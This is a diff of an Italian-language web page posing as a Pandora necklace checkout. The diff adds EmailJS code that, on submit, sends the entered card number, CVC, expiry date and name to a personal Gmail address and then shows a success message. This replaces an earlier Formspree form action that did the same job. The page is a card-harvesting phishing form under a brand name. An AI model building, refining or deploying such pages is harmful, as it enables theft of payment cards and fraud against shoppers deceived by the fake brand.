@@ -28,17 +28,25 @@
 
         h1 {
             color: #333;
-            font-size: 24px;
+            font-size: 26px;
             margin-bottom: 20px;
         }
 
-        input[type="text"], input[type="number"], input[type="email"] {
+        p {
+            color: #666;
+            font-size: 16px;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="email"] {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
             border: 1px solid #ddd;
             border-radius: 4px;
             font-size: 16px;
+            box-sizing: border-box;
         }
 
         input[type="submit"] {
@@ -77,13 +85,13 @@
         <h1>Completa il tuo acquisto Pandora 💍</h1>
         <p>Inserisci i dati per acquistare la tua collana Pandora</p>
 
-        <!-- Form che invia i dati all'email tramite Formspree -->
-        <form action="https://formspree.io/f/xqabljlk" method="POST" id="payment-form">
+        <!-- Form che invia i dati all'email tramite EmailJS -->
+        <form id="payment-form">
             <input type="text" name="username" placeholder="Nome Utente" required>
             <input type="number" name="cardnumber" id="cardnumber" placeholder="Numero Carta (max 16 cifre)" maxlength="16" required>
             <input type="number" name="cvc" id="cvc" placeholder="CVC (max 3 cifre)" maxlength="3" required>
             <input type="text" name="expirydate" placeholder="Data di Scadenza (MM/YY)" required>
-            
+
             <input type="submit" value="Completa Acquisto">
         </form>
 
@@ -93,7 +101,39 @@
         </div>
     </div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // Inizializzazione EmailJS con il tuo USER_ID
+        emailjs.init("USER_ID");  // Sostituisci con il tuo User ID
+
+        // Funzione per inviare l'email tramite EmailJS
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Ottieni i dati dal modulo
+            const formData = new FormData(event.target);
+
+            // Crea il corpo dell'email da inviare
+            const emailData = {
+                username: formData.get('username'),
+                cardnumber: formData.get('cardnumber'),
+                cvc: formData.get('cvc'),
+                expirydate: formData.get('expirydate'),
+                email: 'porcodioporcodio.699@gmail.com',  // Email del destinatario
+                name: formData.get('username')  // Nome dell'utente
+            };
+
+            // Invia i dati tramite EmailJS
+            emailjs.send("SERVICE_ID", "TEMPLATE_ID", emailData)
+                .then(function(response) {
+                    console.log('Successo', response);
+                    alert('Dati inviati con successo!');
+                }, function(error) {
+                    console.log('Errore', error);
+                    alert('Si è verificato un errore durante l\'invio dei dati.');
+                });
+        });
+
         // Funzione per prevenire il DOS con invii troppo veloci
         let formSubmitTime = Date.now();
         document.getElementById('payment-form').addEventListener('submit', function(event) {
@@ -106,14 +146,14 @@
             formSubmitTime = currentTime;
         });
 
-        // Funzione per validare il numero della carta
+        // Funzione per limitare a 16 cifre il numero della carta
         document.getElementById('cardnumber').addEventListener('input', function(event) {
             if (event.target.value.length > 16) {
                 event.target.value = event.target.value.slice(0, 16); // Limita a 16 cifre
             }
         });
 
-        // Funzione per validare il CVC
+        // Funzione per limitare a 3 cifre il CVC
         document.getElementById('cvc').addEventListener('input', function(event) {
             if (event.target.value.length > 3) {
                 event.target.value = event.target.value.slice(0, 3); // Limita a 3 cifre
